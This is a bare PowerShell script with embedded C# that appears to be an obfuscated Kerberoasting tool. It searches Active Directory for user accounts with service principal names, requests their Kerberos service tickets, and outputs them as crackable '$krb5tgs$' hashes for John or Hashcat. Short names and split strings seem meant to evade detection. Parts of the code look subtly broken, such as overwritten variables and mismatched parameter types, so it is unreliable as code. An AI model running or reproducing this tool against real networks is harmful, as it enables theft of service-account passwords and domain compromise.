Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("secur32.dll")]
    public static extern int AcquireCredentialsHandle(
        string pszPrincipal, string pszPackage, uint fCredentialUse,
        IntPtr pvLogonId, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument,
        out IntPtr phCredential, out IntPtr ptsExpiry);
    [DllImport("secur32.dll")]
    public static extern int InitializeSecurityContext(
        IntPtr phCredential, IntPtr phContext, string pszTargetName, uint fContextReq,
        uint Reserved1, uint TargetDataRep, IntPtr pInput, uint Reserved2,
        out IntPtr phNewContext, out IntPtr pOutput, out uint pfContextAttr, out IntPtr ptsExpiry);
    [DllImport("secur32.dll")]
    public static extern int FreeCredentialsHandle(IntPtr phCredential);
    [DllImport("secur32.dll")]
    public static extern int FreeContextBuffer(IntPtr pvContextBuffer);
    public static string GetTicket(string spn) {
        IntPtr cred = IntPtr.Zero, ctx = IntPtr.Zero;
        var buf = new SecBufferDesc { ulVersion = 0, cBuffers = 1, pBuffers = new SecBuffer { BufferType = 2 } };
        IntPtr bufPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SecBuffer)));
        Marshal.StructureToPtr(buf.pBuffers, bufPtr, false);
        buf.pBuffers = bufPtr;
        uint attr;
        try {
            if (AcquireCredentialsHandle(null, "Ker"+"beros", 0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out cred, IntPtr.Zero) != 0) return "";
            if (InitializeSecurityContext(cred, IntPtr.Zero, spn, 0x00001000, 0, 16, IntPtr.Zero, 0, out ctx, out buf, out attr, IntPtr.Zero) != 0) return "";
            var data = new byte[buf.pBuffers.cbBuffer];
            Marshal.Copy(buf.pBuffers.pvBuffer, data, 0, data.Length);
            return BitConverter.ToString(data).Replace("-", "");
        } finally {
            if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
            if (buf.pBuffers.pvBuffer != IntPtr.Zero) FreeContextBuffer(buf.pBuffers.pvBuffer);
            if (bufPtr != IntPtr.Zero) Marshal.FreeHGlobal(bufPtr);
        }
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct SecBuffer {
        public uint cbBuffer;
        public uint BufferType;
        public IntPtr pvBuffer;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct SecBufferDesc {
        public uint ulVersion;
        public uint cBuffers;
        public IntPtr pBuffers;
    }
}
"@

function I-K {
    Param(
        [String[]]$I,
        [Switch]$A,
        [String]$D,
        [String]$F,
        [String]$S,
        [String]$P='Subtree',
        [Int]$R=200,
        [Management.Automation.PSCredential]$C=[Management.Automation.PSCredential]::Empty,
        [String]$O='John'
    )
    $L = 'L' + 'DAP://'
    $Q = if ($D) { $D } else { $Env:USERDNSDOMAIN }
    $B = if ($S) { $S } else { '' }
    $T = $L + $B + $(if ($B -and $Q) { '/' } else { '' }) + $(if ($Q) { "DC=$($Q.Replace('.', ',DC='))" } else { '' })
    $E = if ($C -eq [Management.Automation.PSCredential]::Empty) { 
        New-Object System.DirectoryServices.DirectoryEntry($T) 
    } else { 
        New-Object System.DirectoryServices.DirectoryEntry($T, $C.UserName, $C.GetNetworkCredential().Password) 
    }
    $X = New-Object System.DirectoryServices.DirectorySearcher($E)
    $X.PageSize = $R
    $X.SearchScope = $P
    $X.CacheResults = $False
    $G = ''
    $I | ? {$_} | % {
        $N = $_
        if ($N -match '^S-1-.*') { $G += "(objectsid=$N)" }
        elseif ($N -match '^CN=.*') { $G += "(distinguishedname=$N)" }
        else { 
            $G += try { 
                [Guid]::Parse($N) | Out-Null; "(objectguid=$N)" 
            } catch { 
                "(samAccountName=$N)" 
            }
        }
    }
    $H = "(&(samAccountType=805306368)(servicePrincipalName=*)" + $(if ($G) { "(|$G)" } else { '' }) + $(if ($A) { "(admincount=1)" } else { '' }) + $(if ($F) { $F } else { '' }) + ")"
    $X.Filter = $H
    $R = $X.FindAll()
    $R | ? {$_} | % {
        $U = New-Object PSObject
        $Z = $_.Properties
        $Z.PropertyNames | % {
            $K = $_
            $V = $Z[$K]
            if ($K -in ('objectsid', 'sidhistory')) {
                $U | Add-Member Noteproperty $K (New-Object System.Security.Principal.SecurityIdentifier($V[0], 0)).Value
            }
            elseif ($K -eq 'objectguid') {
                $U | Add-Member Noteproperty $K (New-Object Guid($V[0])).Guid
            }
            elseif ($K -eq 'ntsecuritydescriptor') {
                $U | Add-Member Noteproperty $K (New-Object System.Security.AccessControl.RawSecurityDescriptor($V[0], 0))
            }
            elseif ($K -in ('lastlogon', 'lastlogontimestamp', 'pwdlastset', 'lastlogoff', 'badPasswordTime')) {
                $U | Add-Member Noteproperty $K ([DateTime]::FromFileTime([Int64]$V[0]))
            }
            elseif ($V[0] -is [System.MarshalByRefObject]) {
                try {
                    $M = $V[0]
                    $HP = $M.GetType().InvokeMember('HighPart', 'GetProperty', $Null, $M, $Null)
                    $LP = $M.GetType().InvokeMember('LowPart', 'GetProperty', $Null, $M, $Null)
                    $U | Add-Member Noteproperty $K ([Int64]("0x{0:x8}{1:x8}" -f $HP, $LP))
                } catch {
                    $U | Add-Member Noteproperty $K $V
                }
            }
            elseif ($V.Count -eq 1) {
                $U | Add-Member Noteproperty $K $V[0]
            }
            else {
                $U | Add-Member Noteproperty $K $V
            }
        }
        if ($U.SamAccountName -notmatch 'krbtgt') {
            $W = $U.ServicePrincipalName
            $J = [K]::GetTicket($W)
            if ($J) {
                $A = ($J -replace '^(.*?)04820...(.*)', '$2') -Split 'A48201'
                $A.RemoveAt($A.Count - 1)
                $M = ($A -join 'A48201').Insert(32, '$')
                $O = New-Object PSObject
                $O | Add-Member Noteproperty 's' $U.SamAccountName
                $O | Add-Member Noteproperty 'd' $U.distinguishedname
                $O | Add-Member Noteproperty 'sp' $W
                $O | Add-Member Noteproperty 'h' $(if ($O -eq 'John') { "`$krb5tgs`$unknown:$M" } else { '$krb5tgs$23$*ID#124_DN:' + $U.distinguishedname + ' SPN:' + $W + '*' + $M })
                $O
            }
        }
        if ($_.Path) { $_.GetDirectoryEntry().Dispose() }
    }
    $X.Dispose()
    if ($E) { $E.Dispose() }
    if ($R) { $R.Dispose() }
}
